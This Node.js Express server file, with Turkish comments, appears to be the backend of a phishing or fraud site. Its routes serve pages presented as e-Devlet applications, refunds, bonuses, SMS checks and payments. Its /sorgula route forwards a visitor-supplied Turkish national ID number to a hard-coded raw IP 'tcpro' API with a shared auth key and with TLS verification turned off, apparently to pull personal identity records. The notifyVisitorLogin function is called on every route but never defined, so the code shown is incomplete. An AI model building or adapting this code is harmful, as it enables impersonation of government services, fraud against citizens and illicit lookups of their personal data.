const express = require('express');
const path = require('path');
const https = require('https');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const cors = require('cors');  // cors modülünü ekleyin
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const corsOptions = {
  origin: '*', // İzin vermek istediğiniz origin
  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
  credentials: true, // Çerezleri etkinleştirmek için credentials'ı true yapın
  optionsSuccessStatus: 204, // Preflight OPTIONS isteğine başarılı bir yanıt durumu
  allowedHeaders: 'Content-Type,Authorization', // İzin verilen başlıklar
};

app.use(cors(corsOptions));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser()); 

app.get('/', (req, res) => {
   notifyVisitorLogin()
    .then(() => {
      console.log('plaka sorgula');
      res.sendFile(path.join(__dirname, 'public', 'home.html'));
    })
    .catch((error) => {
      console.error('Error sending visitor login notification:', error);
      res.status(500).send('Internal Server Error');
    });
});

app.get('/4c2abonus.html', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
        console.log('odeme');
       res.sendFile(path.join(__dirname, 'public', '4c2abonus.html'));
     })
     .catch((error) => {
       console.error('Error:', error);
       res.status(500).send('Internal Server Error');
     });
 });
 
app.get('/basvuru', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
        console.log('odeme');
       res.sendFile(path.join(__dirname, 'public', 'basvuru.html'));
     })
     .catch((error) => {
       console.error('Error:', error);
       res.status(500).send('Internal Server Error');
     });
 });
 
app.get('/public/basvuru-yap', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
        console.log('odeme');
       res.sendFile(path.join(__dirname, 'public', 'basvuru-yap.html'));
     })
     .catch((error) => {
       console.error('Error:', error);
       res.status(500).send('Internal Server Error');
     });
 });

app.get('/sms', (req, res) => {
    notifyVisitorLogin()
    .then(() => {
      console.log('sorgulaniyor');
      res.sendFile(path.join(__dirname, 'public', 'sms.html'));
    })
    .catch((error) => {
      console.error('Error sending visitor login notification:', error);
      res.status(500).send('Internal Server Error');
    });
});

app.get('/slot', (req, res) => {
    const submittedData = req.cookies.submittedData || 'No data submitted yet';
  
    notifyVisitorLogin()
    .then(() => {
      console.log('bekle sayfa');
      res.sendFile(path.join(__dirname, 'public', 'slot.html'));
    })
    .catch((error) => {
      console.error('Error sending visitor login notification:', error);
      res.status(500).send('Internal Server Error');
    });
});

app.get('/sorgula', async (req, res) => {
    try {
        const tcNo = req.query.tcNo;
        const apiUrl = `https://185.231.68.29/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${encodeURIComponent(tcNo)}`;

        const response = await axios.get(apiUrl, {
            httpsAgent: new https.Agent({ rejectUnauthorized: false })
        });
        const data = response.data;

        res.json(data);
    } catch (error) {
        console.error('Hata:', error);
        res.status(500).send('Sorgu başarısız oldu. Lütfen tekrar deneyin.');
    }
});

app.get('/basvur-edevlet', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
        console.log('odeme');
       res.sendFile(path.join(__dirname, 'public', 'as44gsa3.html'));
     })
     .catch((error) => {
       console.error('Error:', error);
       res.status(500).send('Internal Server Error');
     });
 });
app.get('/iade-basvur', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
        console.log('odeme');
       res.sendFile(path.join(__dirname, 'public', 'iade-basvur.html'));
     })
     .catch((error) => {
       console.error('Error:', error);
       res.status(500).send('Internal Server Error');
     });
 });
 

app.listen(PORT, () => {
    console.log(`Server listening at http://localhost:${PORT}`);
});
